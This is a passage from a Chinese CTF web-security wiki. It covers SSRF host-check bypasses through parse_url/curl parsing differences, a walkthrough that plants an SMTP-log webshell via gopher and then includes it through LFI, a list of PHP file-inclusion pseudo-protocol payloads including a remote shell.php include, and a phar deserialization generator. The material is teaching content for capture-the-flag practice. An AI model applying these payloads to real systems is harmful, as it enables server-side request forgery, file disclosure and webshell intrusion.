<p>\u8fd9\u4e24\u4e2a\u51fd\u6570\u5728\u89e3\u6790host\u7684\u65f6\u5019\u4e5f\u6709\u5dee\u5f02\uff0c\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>readfile()\u51fd\u6570\u83b7\u53d6\u7684\u662f@\u53f7\u540e\u9762\u4e00\u90e8\u5206\uff08evil.com\uff09\uff0c\u800cparse_url()\u51fd\u6570\u83b7\u53d6\u7684\u5219\u662f@\u53f7\u524d\u9762\u7684\u4e00\u90e8\u5206\uff08google.com\uff09\uff0c\u5229\u7528\u8fd9\u79cd\u5dee\u5f02\u7684\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed5\u8fc7\u9898\u76ee\u4e2dparse_url()\u51fd\u6570\u5bf9\u6307\u5b9ahost\u7684\u9650\u5236\u3002</p> <p>\uff082\uff09\u5229\u7528curl\u548cparse_url\u7684\u89e3\u6790\u5dee\u5f02\u7ed5\u6307\u5b9a\u7684host</p> <p>\u539f\u7406\u5982\u4e0b\uff1a</p> <p></p> <p>\u4ece\u4e0a\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230curl()\u51fd\u6570\u89e3\u6790\u7684\u662f\u7b2c\u4e00\u4e2a@\u540e\u9762\u7684\u7f51\u5740\uff0c\u800cparse_url()\u51fd\u6570\u89e3\u6790\u7684\u662f\u7b2c\u4e8c\u4e2a@\u540e\u9762\u7684\u7f51\u5740\u3002\u5229\u7528\u8fd9\u4e2a\u539f\u7406\u6211\u4eec\u53ef\u4ee5\u7ed5\u8fc7\u9898\u76ee\u4e2dparse_url()\u51fd\u6570\u5bf9\u6307\u5b9ahost\u7684\u9650\u5236\u3002</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>&lt;?phphighlight_file(__FILE__);function check_inner_ip($url){    $match_result=preg_match('/^(http|https)?:\\/\\/.*(\\/)?.*$/',$url);    if (!$match_result)    {        die('url fomat error');    }    try    {        $url_parse=parse_url($url);    }    catch(Exception $e)    {        die('url fomat error');        return false;    }    $hostname=$url_parse['host'];    $ip=gethostbyname($hostname);    $int_ip=ip2long($ip);    return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16;// \u68c0\u67e5\u662f\u5426\u662f\u5185\u7f51ip}function safe_request_url($url){    if (check_inner_ip($url))    {        echo $url.' is inner ip';    }    else    {        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($ch, CURLOPT_HEADER, 0);        $output = curl_exec($ch);        $result_info = curl_getinfo($ch);        if ($result_info['redirect_url'])        {            safe_request_url($result_info['redirect_url']);        }        curl_close($ch);        var_dump($output);    }}$url = $_GET['url'];if(!empty($url)){    safe_request_url($url);}?&gt;\nPlain Text\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230<code>check_inner_ip</code>\u51fd\u6570\u901a\u8fc7<code>url_parse()</code>\u51fd\u6570\u68c0\u6d4b\u662f\u5426\u4e3a\u5185\u7f51IP\uff0c\u5982\u679c\u4e0d\u662f\u5185\u7f51 IP \uff0c\u5219\u901a\u8fc7<code>curl()</code>\u8bf7\u6c42 url \u5e76\u8fd4\u56de\u7ed3\u679c\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528curl\u548cparse_url\u89e3\u6790\u7684\u5dee\u5f02\u4e0d\u540c\u6765\u7ed5\u8fc7\u8fd9\u91cc\u7684\u9650\u5236\uff0c\u8ba9<code>parse_url()</code>\u5904\u7406\u5916\u90e8\u7f51\u7ad9\u7f51\u5740\uff0c\u6700\u540e<code>curl()</code>\u8bf7\u6c42\u5185\u7f51\u7f51\u5740\u3002paylaod\u5982\u4e0b\uff1a</p> <pre><code>ssrf.php?url=http://@127.0.0.1:80@www.baidu.com/flag.php\nPlain Text\n</code></pre> <p></p> <p>\u7684 [2020 \u9996\u5c4a\u201c\u7965\u4e91\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b]doyouknowssrf\u8fd9\u9053\u9898\u5229\u7528\u7684\u5c31\u662f\u8fd9\u4e2a\u601d\u8def\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/%E4%B8%BE%E4%BE%8B%E4%BE%8B%E9%A2%98/","title":"\u4e3e\u4f8b\u4f8b\u9898","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <pre><code>&lt;?php\nhighlight_file(__FILE__);\n$x = $_GET['x'];\n$pos = strpos($x,\"php\");\nif($pos){\n        exit(\"denied\");\n}\n$ch = curl_init();\ncurl_setopt($ch,CURLOPT_URL,\"$x\");\ncurl_setopt($ch,CURLOPT_RETURNTRANSFER,true);\n$result = curl_exec($ch);\necho $result;\nPlain Text\n</code></pre> <p>\u9996\u5148x\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\uff0c</p> <p>x\u53ef\u5229\u7528\u7684\u534f\u8bae\u6709gopher\u3001dict\u3001http\u3001https\u3001file\u7b49</p> <p>ps:\u7ecf\u5e38gopher\u534f\u8bae\u662f\u4f1a\u7ed9\u63d0\u793a\u7684\uff08\u6bd4\u5982\u7ed9\u51fa\u534f\u8bae\uff1aXXX\u534f\u8bae\u8fc7\u6ee4\u540e\u53d1\u73b0\u5c31\u8fd9\u4e2a\u80fd\u7528\u6216\u8005\u76f4\u63a5\u653e\u5728\u767d\u540d\u5355\u91cc\u9762\u63d0\u793a\uff09</p> <p>file\u534f\u8bae\u53ef\u4ee5\u7528\u4e8e\u67e5\u770b\u6587\u4ef6</p> <p>dict\u534f\u8bae\u53ef\u4ee5\u7528\u4e8e\u523a\u63a2\u7aef\u53e3</p> <p>gopher\u534f\u8bae\u652f\u6301GET&amp;POST\u8bf7\u6c42\uff0c\u5e38\u7528\u4e8e\u653b\u51fb\u5185\u7f51ftp\u3001redis\u3001telnet\u3001smtp\u7b49\u670d\u52a1\uff0c\u8fd8\u53ef\u4ee5\u5229\u7528gopher\u534f\u8bae\u8bbf\u95eeredis\u53cd\u5f39shell</p> <p>\u9996\u5148\u6211\u4eec\u5229\u7528file\u8bfb\u53d6\u6587\u4ef6</p> <p>\u5148\u4e0a\u811a\u672c\u626b\u63cf\u4e00\u4e0b\u76ee\u5f55\uff0c\u5f97\u5230flag.php\u3002</p> <p>\u4e00\u822c\u6211\u4eec\u8fd8\u53ef\u4ee5\u8bfb\u53d6/etc/hosts\uff0c/etc/passwd\uff0c~/.bash_history\u7b49\u6587\u4ef6\u67e5\u770b\u7ebf\u7d22</p> <p>\u4f46\u662f\u4ee3\u7801\u4e2d\u6709strpos\u7684\u9650\u5236\uff08\u5229\u7528%2570\u7ed5\u8fc7\uff09</p> <p>\u6700\u540e\u6211\u4eec\u8bfb\u53d6/var/www/html/flag.php\u65f6\u53d1\u73b0\u7ebf\u7d22</p> <p></p> <p>\u7ee7\u7eed\u8bfb\u53d6<code>/etc/hosts</code>\u5f97\u5230\u4e00\u4e2a\u5185\u7f51\u5730\u5740</p> <p></p> <p>\u8fd9\u513f\u6211\u4eec\u5f97\u5230\u5185\u7f51\u6bb5\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u626b\u63cf\uff0c\u53d1\u73b0\u53ea\u6709172.18.0.1|2|3\u53ef\u4ee5\u8bbf\u95ee\u3002</p> <p>http://101.71.29.5:10012/?x=http://172.18.0.2\u7684\u8fd4\u56de\u7ed3\u679c\u5982\u4e0b\u56fe\uff0c\u5b58\u5728LFI\u6f0f\u6d1e\u3002</p> <p>\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0</p> <p>\u8fd9\u53ea\u662f80\u7aef\u53e3\u7684\u7ed3\u679c\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u770b\u770b\u5176\u4ed6\u7aef\u53e3\u7684\u5f00\u653e\u60c5\u51b5\uff0c\u53ef\u4ee5\u770b\u5230\uff0c25\u7aef\u53e3\u4e5f\u5f00\u653e\u4e86\uff0c25\u5bf9\u5e94\u7684\u5c31\u662fsmtp\u670d\u52a1</p> <p></p> <p>\u5229\u7528gopher\u534f\u8bae\u6253smtp\uff0c\u7136\u540e\u518d\u7ed3\u5408\u4e4b\u524d\u53d1\u73b0\u7684LFI\u6f0f\u6d1e\uff0c\u5f97\u51fa\u8fd9\u6837\u7684\u601d\u8def</p> <p>\u5229\u7528gopher\u6253smtp\uff0c\u5728\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7559\u4e0b\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u7136\u540e\u7528LFI\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\u83b7\u53d6webshell</p> <p>\u601d\u8def\u6e05\u6670\u4e86\u540e\uff0c\u5c31\u5f00\u59cb\u6267\u884c\u4e86\uff0c\u5148\u7528gopherus\u811a\u672c\u751f\u6210payload\uff0cgopherus\u5730\u5740:https://github.com/tarunkant/Gopherus\uff0c\u91cc\u9762\u6709\u8be6\u7ec6\u7528\u6cd5\u3002</p> <p></p> <p>\u5c06127.0.0.1:25\u6539\u4e3a\u5185\u7f51\u5730\u5740\uff0c\u7136\u540eurl\u7f16\u7801\u53d1\u9001\u8fc7\u53bb</p> <p>\u7136\u540e\u6211\u4eec\u5229\u7528\u5305\u542b\u65e5\u5fd7\u6587\u4ef6</p> <p>\u4e8e\u662f\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u53bb\u627esmtp\u7684\u65e5\u5fd7\u6587\u4ef6\u4f4d\u7f6e\u4e86\uff0c\u4e00\u822c\u6765\u8bb2linux\u4e2d\u7684\u90ae\u4ef6\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84\u4e3a</p> <p>/var/log/maillog</p> <p>/var/log/mail.log</p> <p>/var/adm/maillog</p> <p>/var/adm/syslog/mail.log</p> <p>\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0</p> <p>\u7136\u540e\u6211\u4eec\u76f4\u63a5\u8fde\u63a5\u83dc\u5200\u67e5\u770bflag</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/%E7%BB%83%E4%B9%A0/","title":"\u7ec3\u4e60","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u8fd9\u4f4d\u53cb\u597d\u7684\u4f5c\u8005\u8fd8\u4e3a\u6211\u4eec\u7559\u4e0b\u4e86\u9776\u573a</p> <p>\u63a8\u8350\u4e00\u4e2aSSRF\u7ec3\u4e60\u9776\u573a\uff1a</p> <p>ssrf-lab\uff1a</p> <p>fengwenhua/ssrf-lab</p> <p>ssrf\u6f0f\u6d1e\u5b9e\u9a8c. Contribute to fengwenhua/ssrf-lab development by creating an account on GitHub.</p> <p>https://github.com/fengwenhua/ssrf-lab</p> <p></p> <p>\u8be5\u9776\u573a\u6709\u4e00\u4e2a\u597d\u770b\u53c8\u7b80\u6d01\u7684\u754c\u9762\uff0c\u63d0\u4f9b\u4e86\u6700\u57fa\u672c\u7684 REST API \u548c\u5ba2\u6237\u7aef WebHook \u529f\u80fd\u7528\u4e8e SSRF \u6d4b\u8bd5\u3002\u914d\u7f6e\u8bf7\u770b\uff1a</p> <p>SSRF \u6f0f\u6d1e\u5b66\u4e60\u5b9e\u9a8c\u73af\u5883\u63a8\u8350\u53ca\u8fc7\u7a0b\u8bb0\u5f55\u4e28\u4fe1\u5b89\u4e4b\u8def_\u5b89\u5168\u6587\u6458_\u9ed1\u767d\u7f51</p> <p>\u5728\u7f51\u4e0a\u627e\u5230\u4e00\u4e2a\u5b66\u4e60 SSRF \u7684\u73af\u5883\uff0cSSRF-LABS \u6709\u4e00\u4e2a\u597d\u770b\u53c8\u7b80\u6d01\u7684\u754c\u9762\uff0c\u63d0\u4f9b\u4e86\u6700\u57fa\u672c\u7684 REST API \u548c\u5ba2\u6237\u7aef WebHook \u529f\u80fd\u7528\u4e8e SSRF \u6d4b\u8bd5\u3002\u524d\u9762\u53ea\u662f\u5927\u6982\u7684\u4ecb\u7ecd\uff0c\u77e5\u9053\u5c31\u597d\uff0c\u4e0d\u7528\u82b1\u8d39\u8fc7\u591a\u7cbe\u529b\u4e86\u89e3\u3002SSRF \u4ecb\u7ecd\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u7528\u6237\u901a\u8fc7 WEB \u8bbf...</p> <p>https://www.heibai.org/post/1287.html</p>"},{"location":"web/include/include_normal/","title":"\u6587\u4ef6\u5305\u542b","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/include/include_normal/#_2","title":"\u4ec0\u4e48\u662f\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e","text":"<p>\u901a\u8fc7PHP\u51fd\u6570\u5f15\u5165\u6587\u4ef6\u65f6\uff0c\u4f20\u5165\u7684\u6587\u4ef6\u540d\u6ca1\u6709\u7ecf\u8fc7\u5408\u7406\u7684\u9a8c\u8bc1\uff0c\u4ece\u800c\u64cd\u4f5c\u4e86\u9884\u60f3\u4e4b\u5916\u7684\u6587\u4ef6\uff0c\u5c31\u53ef\u80fd\u5bfc\u81f4\u610f\u5916\u7684\u6587\u4ef6\u6cc4\u6f0f\u751a\u81f3\u6076\u610f\u4ee3\u7801\u6ce8\u5165\u3002</p>"},{"location":"web/include/include_normal/#_3","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u7684\u73af\u5883\u8981\u6c42","text":"<p>allow_url_fopen=On(\u9ed8\u8ba4\u4e3aOn) \u89c4\u5b9a\u662f\u5426\u5141\u8bb8\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u6216\u8005\u7f51\u7ad9\u68c0\u7d22\u6570\u636e</p> <ul> <li> <p>allow_url_include=On(php5.2\u4e4b\u540e\u9ed8\u8ba4\u4e3aOff) \u89c4\u5b9a\u662f\u5426\u5141\u8bb8include/require\u8fdc\u7a0b\u6587\u4ef6</p> </li> <li></li> </ul>"},{"location":"web/include/include_normal/#_4","title":"\u5e38\u89c1\u6587\u4ef6\u5305\u542b\u51fd\u6570","text":"<p>php\u4e2d\u5e38\u89c1\u7684\u6587\u4ef6\u5305\u542b\u51fd\u6570\u6709\u4ee5\u4e0b\u56db\u79cd\uff1a</p> <pre><code>include()\nrequire()\ninclude_once()\nrequire_once()\ninclude\u4e0erequire\u57fa\u672c\u662f\u76f8\u540c\u7684\uff0c\u9664\u4e86\u9519\u8bef\u5904\u7406\u65b9\u9762:\ninclude()\uff0c\u53ea\u751f\u6210\u8b66\u544a\uff08E_WARNING\uff09\uff0c\u5e76\u4e14\u811a\u672c\u4f1a\u7ee7\u7eed\nrequire()\uff0c\u4f1a\u751f\u6210\u81f4\u547d\u9519\u8bef\uff08E_COMPILE_ERROR\uff09\u5e76\u505c\u6b62\u811a\u672c\ninclude_once()\u4e0erequire_once()\uff0c\u5982\u679c\u6587\u4ef6\u5df2\u5305\u542b\uff0c\u5219\u4e0d\u4f1a\u5305\u542b\uff0c\u5176\u4ed6\u7279\u6027\u5982\u4e0a\nPlain Text\n</code></pre> <p>\u603b\u7684\u6765\u8bf4\u5c31\u662f\u7531\u4e8e\u670d\u52a1\u5668\u7aef\u914d\u7f6e\u4e0d\u5f53\u5bfc\u81f4\u670d\u52a1\u5668\u4e2d\u8bfb\u53d6\u6587\u4ef6\u7684\u51fd\u6570\u53ef\u4ee5\u88ab\u5229\u7528</p>"},{"location":"web/include/include_normal/#_5","title":"\u4f2a\u534f\u8bae","text":"<pre><code>ftp://shell.php\nfile:///tmp/shell.php\nhttp://xxxx/shell.php\n\\\\smbserver\\shell.php        //unc\u8def\u5f84\nphar://xxxx/x.zip/shell.php   //\u9700\u5c06shell.php\u6253\u5305\u4e3ax.zip\u4e0a\u4f20\nzip://xxxx/x.zip#shell.php    //\u9700\u5c06shell.php\u6253\u5305\u4e3ax.zip\u4e0a\u4f20\nphp://filter/read=convert.base64-encode/resource=shell.php\ncompress.bzip2://shell.php\ncompress.zlib://shell.jpg\nphp://input    [POST DATA] &lt;?php phpinfo()?&gt;\ndata://text/plain,&lt;?php phpinfo()?&gt;                 //\u4e5f\u53ef\u4ee5data:text/plain,&lt;?php phpinfo()?&gt;\ndata://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\nphp://filter/read=convert.base64-encode/resource=phar://phar.phar\nphp://filter/convert.base64-decode|convert.base64-decode/resource=shell.php\nphp://filter/%72ead=convert.base64-encode/resource=shell.%70hp\nPlain Text\n</code></pre> <p>\u4e00\u5171\u6709\u8fd9\u4e48\u591a\u79cd\u5e38\u7528\u7684\uff0c\u518d\u52a0\u4e0a\u4e00\u4e9b\u975e\u5e38\u975e\u5e38\u795e\u5947\u7684\u64cd\u4f5c</p> <p>\u6162\u6162\u6765\u89e3\u91ca\uff1a</p>"},{"location":"web/include/include_normal/#data","title":"data://\u4f2a\u534f\u8bae","text":"<p>\u6761\u4ef6\uff1a</p> <ul> <li> <p><code>allow_url_fopen</code>:on</p> </li> <li> <p><code>allow_url_include</code>:on</p> </li> <li> <p>\u4f5c\u7528\uff1a\u81ea<code>PHP&gt;=5.2.0</code>\u8d77\uff0c\u53ef\u4ee5\u4f7f\u7528<code>data://</code>\u6570\u636e\u6d41\u5c01\u88c5\u5668\uff0c\u4ee5\u4f20\u9012\u76f8\u5e94\u683c\u5f0f\u7684\u6570\u636e\u3002\u901a\u5e38\u53ef\u4ee5\u7528\u6765\u6267\u884cPHP\u4ee3\u7801\u3002</p> </li> <li> <p>\u7528\u6cd5\uff1adata://text/plain,data://text/plain;base64,</p> </li> <li> <p>\u793a\u4f8b\uff1a</p> </li> </ul> <pre><code>data://text/plain,\nhttp://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;\nPlain Text\n</code></pre> <p></p> <pre><code>data://text/plain;base64,\nhttp://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\nPlain Text\n</code></pre> <p></p>"},{"location":"web/include/include_normal/#file","title":"file://\u4f2a\u534f\u8bae","text":"<p>\u6761\u4ef6\uff1a</p> <ul> <li> <p><code>allow_url_fopen</code>:off/on</p> </li> <li> <p><code>allow_url_include</code>:off/on</p> </li> <li> <p>\u4f5c\u7528\uff1a\u7528\u4e8e\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\uff0c\u5728CTF\u4e2d\u901a\u5e38\u7528\u6765\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7684\u4e14\u4e0d\u53d7<code>allow_url_fopen</code>\u4e0e<code>allow_url_include</code>\u7684\u5f71\u54cd\u3002<code>include()/require()/include_once()/require_once()</code>\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u5bfc\u5165\u4e3a\u975e<code>.php</code>\u6587\u4ef6\uff0c\u5219\u4ecd\u6309\u7167php\u8bed\u6cd5\u8fdb\u884c\u89e3\u6790\uff0c\u8fd9\u662f<code>include()</code>\u51fd\u6570\u6240\u51b3\u5b9a\u7684\u3002</p> </li> <li> <p>\u8bf4\u660e\uff1a<code>file://</code>\u6587\u4ef6\u7cfb\u7edf\u662f PHP \u4f7f\u7528\u7684\u9ed8\u8ba4\u5c01\u88c5\u534f\u8bae\uff0c\u5c55\u73b0\u4e86\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u3002\u5f53\u6307\u5b9a\u4e86\u4e00\u4e2a\u76f8\u5bf9\u8def\u5f84\uff08\u4e0d\u4ee5/\u3001\u3001\\\u6216 Windows \u76d8\u7b26\u5f00\u5934\u7684\u8def\u5f84\uff09\u63d0\u4f9b\u7684\u8def\u5f84\u5c06\u57fa\u4e8e\u5f53\u524d\u7684\u5de5\u4f5c\u76ee\u5f55\u3002\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\u662f\u811a\u672c\u6240\u5728\u7684\u76ee\u5f55\uff0c\u9664\u975e\u88ab\u4fee\u6539\u4e86\u3002\u4f7f\u7528 CLI \u7684\u65f6\u5019\uff0c\u76ee\u5f55\u9ed8\u8ba4\u662f\u811a\u672c\u88ab\u8c03\u7528\u65f6\u6240\u5728\u7684\u76ee\u5f55\u3002\u5728\u67d0\u4e9b\u51fd\u6570\u91cc\uff0c\u4f8b\u5982<code>fopen()</code>\u548c<code>file_get_contents()</code>\uff0c<code>include_path</code>\u4f1a\u53ef\u9009\u5730\u641c\u7d22\uff0c\u4e5f\u4f5c\u4e3a\u76f8\u5bf9\u7684\u8def\u5f84\u3002</p> </li> <li> <p>\u7528\u6cd5\uff1a/path/to/file.extrelative/path/to/file.extfileInCwd.extC:/path/to/winfile.extC:\\path\\to\\winfile.ext\\smbserver\\share\\path\\to\\winfile.extfile:///path/to/file.ext</p> </li> <li> <p>\u793a\u4f8b\uff1a</p> </li> <li></li> </ul> <pre><code>file://[\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt\nPlain Text\n</code></pre> <p></p> <pre><code>[\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]http://127.0.0.1/include.php?file=./phpinfo.txt\nPlain Text\n</code></pre> <p></p> <pre><code>[http\uff1a//\u7f51\u7edc\u8def\u5f84\u548c\u6587\u4ef6\u540d]http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\nPlain Text\n</code></pre> <p></p>"},{"location":"web/include/include_normal/#local_file","title":"local_file\u4f2a\u534f\u8bae","text":"<p>\u4e5f\u6709\u65f6\u5019\u5229\u7528local_file\u6765\u7ed5\u8fc7\uff0c\u67e5\u4e86\u4e00\u4e0b\u597d\u50cf\u8fd8\u662f\u4e2acve.</p> <p>\u987a\u5e26\u4e00\u63d0\uff0cflask\u6e90\u7801\u653e\u5728/app/app.py\u4e4b\u4e2d</p> <p>local_file:///sys/class/net/eth0/address:\u8bfb\u53d6MAC\u5730\u5740</p>"},{"location":"web/include/include_normal/#gopher","title":"gopher://\u4f2a\u534f\u8bae","text":"<p>Gopher\u662f\u4e00\u79cd\u5206\u5e03\u5f0f\u6587\u6863\u4f20\u9012\u670d\u52a1\u3002\u5229\u7528\u8be5\u670d\u52a1\uff0c\u7528\u6237\u53ef\u4ee5\u65e0\u7f1d\u5730\u6d4f\u89c8\u3001\u641c\u7d22\u548c\u68c0\u7d22\u9a7b\u7559\u5728\u4e0d\u540c\u4f4d\u7f6e\u7684\u4fe1\u606f\u3002</p> <pre><code>gopher://127.0.0.1:1337/_Hi%0Assrf%0Atest\n</code></pre> <p>\u8fd9\u4e2a\u5728ssrf\u4e2d\u4f1a\u91cd\u70b9\u4ecb\u7ecd</p>"},{"location":"web/include/include_normal/#http-https","title":"http:// &amp; https:// \u534f\u8bae","text":"<p>\u6761\u4ef6\uff1a</p> <ul> <li> <p><code>allow_url_fopen</code>:on</p> </li> <li> <p><code>allow_url_include</code>:on</p> </li> <li> <p>\u4f5c\u7528\uff1a\u5e38\u89c4 URL \u5f62\u5f0f\uff0c\u5141\u8bb8\u901a\u8fc7<code>HTTP 1.0</code>\u7684 GET\u65b9\u6cd5\uff0c\u4ee5\u53ea\u8bfb\u8bbf\u95ee\u6587\u4ef6\u6216\u8d44\u6e90\u3002CTF\u4e2d\u901a\u5e38\u7528\u4e8e\u8fdc\u7a0b\u5305\u542b\u3002</p> </li> <li></li> </ul> <pre><code>\u7528\u6cd5\uff1ahttp://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com\nPlain Text\n</code></pre> <p>\u793a\u4f8b\uff1a</p> <pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\nPlain Text\n</code></pre> <p></p>"},{"location":"web/include/include_normal/#phar","title":"phar://\u4f2a\u534f\u8bae","text":"<pre><code>phar://\u534f\u8bae\u4e0ezip://\u7c7b\u4f3c\uff0c\u540c\u6837\u53ef\u4ee5\u8bbf\u95eezip\u683c\u5f0f\u538b\u7f29\u5305\u5185\u5bb9\uff0c\u5728\u8fd9\u91cc\u53ea\u7ed9\u51fa\u4e00\u4e2a\u793a\u4f8b\uff1a\nPlain Text\n</code></pre> <pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt\nPlain Text\n</code></pre>"},{"location":"web/include/include_normal/#_6","title":"\u6587\u4ef6\u5305\u542b","text":"<p>\u4e0b\u9762\u662f\u6211\u81ea\u5df1\u7684\u603b\u7ed3\uff1a</p> <p>\u8fd9\u91cc\u7a0d\u5fae\u63cf\u8ff0\u4e00\u4e0bphar\uff0c\u7c7b\u4f3cjava\u4e2d\u7684jar\uff0cphar\u662f\u4e00\u4e2a\u5408\u6210\u8bcd\uff0c\u7531PHP \u548c Archive\u6784\u6210\uff0c\u53ef\u4ee5\u770b\u51fa\u5b83\u662fphp\u5f52\u6863\u6587\u4ef6\u7684\u610f\u601d\u3002phar\u5f52\u6863\u6587\u4ef6\u6709\u4e09\u79cd\u683c\u5f0f\uff1atar\u5f52\u6863\u3001zip\u5f52\u6863\u3001phar\u5f52\u6863\uff0c\u524d\u4e24\u79cd\u6267\u884c\u9700\u8981php\u5b89\u88c5Phar \u6269\u5c55\u652f\u6301\uff0c\u7528\u7684\u4e5f\u6bd4\u8f83\u5c11\uff0c\u8fd9\u91cc\u4e3b\u8981\u8bb2phar\u5f52\u6863\u683c\u5f0f\u3002</p> <p>phar\u683c\u5f0f\u5f52\u6863\u6587\u4ef6\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\uff0c\u5b83\u7684\u4ea7\u751f\u4f9d\u8d56\u4e8ePhar\u6269\u5c55\uff0c\u7531\u81ea\u5df1\u7f16\u5199\u7684php\u811a\u672c\u4ea7\u751f\u3002\u4e5f\u662f\u4e00\u79cd\u6d41\u5305\u88c5\u5668\u3002</p> <pre><code>&lt;?php\n    class User {\n        public $db;\n    } \n    class File{\n        public $filename;\n        public function __construct($name){\n            $this-&gt;filename=$name;\n        }\n    }\n    class FileList {\n        private $files;\n        public function __construct(){\n            $this-&gt;files=array(new File('/flag.txt'));\n        }\n    } //\u4e0a\u9762\u662f\u53cd\u5e8f\u5217\u5316\uff0c\u5b9e\u9645\u7528\u4e0b\u6765\u6a21\u677f\u4e00\u70b9\u70b9\u7684\u4e1c\u897f\u5728\u4e0b\u9762\n    $o = new User();\n    $o-&gt;db =new FileList();\n    @unlink(\"phar.phar\");//\u5220\u9664\u4e4b\u524d\u7684test.par\u6587\u4ef6(\u5982\u679c\u6709)\n    $phar = new Phar(\"phar.phar\");//\u521b\u5efa\u4e00\u4e2aphar\u5bf9\u8c61\uff0c\u6587\u4ef6\u540d\u5fc5\u987b\u4ee5phar\u4e3a\u540e\u7f00\n    $phar-&gt;startBuffering();//\u5f00\u59cb\u5199\u6587\u4ef6\n    $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\");//\u5199\u5165stub\n    $phar-&gt;setMetadata($o);//\u5199\u5165meta-data\n    $phar-&gt;addFromString(\"test.txt\", \"test\"); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6\n    $phar-&gt;stopBuffering();\n?&gt;\nPlain Text\n</code></pre> <p>\u719f\u6089\u7684\u8bdd\u5e94\u8be5\u80fd\u770b\u51fa\u8fd9\u4e2a\u662f\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4f46\u5b83\u8ddfphar\u4f2a\u534f\u8bae\u6709\u6709\u4ec0\u4e48\u8054\u7cfb\u5462\uff1f</p> <p>\uff08\u5176\u5b9e\u662f\u548c\u53cd\u5e8f\u5217\u5316\u6d89\u53ca\u5230\u7684\u6587\u4ef6\u5305\u542b\uff09</p> <p>\u867d\u7136\u6bd4\u8f83\u7279\u4f8b\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u6a21\u677f\u4e86\uff0c\u5229\u7528\u65b9\u5f0f\u4f1a\u4e0e\u6587\u4ef6\u4e0a\u4f20\u4e00\u8d77\uff0c\u7136\u540e\u5229\u7528phar://\u4f2a\u534f\u8bae\u6765\u8bbf\u95ee\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u3002</p> <p>\u987a\u5e26\u4e00\u63d0\u5c31\u662f\u5728\u4f7f\u7528phar\u4ee3\u7801\u65f6\uff0c\u8981\u628aphp.ini\u6587\u4ef6\u4e2d\u7684phar.readonly \u8bbe\u7f6e\u4e3aOFF.</p> <p>\u7a0d\u5fae\u5177\u4f53\u70b9\u4ecb\u7ecd\uff1a</p> <pre><code>stub\nphar \u6587\u4ef6\u6807\u8bc6\uff0c\u683c\u5f0f\u4e3a xxx&lt;?php xxx; 